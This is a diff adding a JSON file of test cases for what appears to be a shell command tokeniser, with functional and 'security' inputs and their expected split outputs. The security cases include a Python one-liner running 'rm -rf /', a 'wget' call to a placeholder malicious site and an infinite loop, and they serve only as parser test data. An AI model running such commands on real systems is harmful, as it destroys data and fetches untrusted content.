@@ -1,0 +1,38 @@
+{
+  "functional": [
+    {
+      "input": "ls -la /home",
+      "expected_output": "[\"ls\", \"-la\", \"/home\", \"NULL\"]"
+    },
+    {
+      "input": "echo Hello World",
+      "expected_output": "[\"echo\", \"Hello\", \"World\", \"NULL\"]"
+    },
+    {
+      "input": "cp source destination",
+      "expected_output": "[\"cp\", \"source\", \"destination\", \"NULL\"]"
+    },
+    {
+      "input": "gcc main.c -o output",
+      "expected_output": "[\"gcc\", \"main.c\", \"-o\", \"output\", \"NULL\"]"
+    }
+  ],
+  "security": [
+    {
+      "input": "/bin/sh -c 'evil_command'",
+      "expected_output": "[\"/bin/sh\", \"-c\", \"evil_command\", \"NULL\"]"
+    },
+    {
+      "input": "/usr/bin/python -c 'import os; os.system(\"rm -rf /\")'",
+      "expected_output": "[\"/usr/bin/python\", \"-c\", \"import os; os.system(\\\"rm -rf /\\\")\", \"NULL\"]"
+    },
+    {
+      "input": "python -c 'while True: pass'",
+      "expected_output": "[\"python\", \"-c\", \"while True: pass\", \"NULL\"]"
+    },
+    {
+      "input": "wget http://malicious.site",
+      "expected_output": "[\"wget\", \"http://malicious.site\", \"NULL\"]"
+    }
+  ]
+}
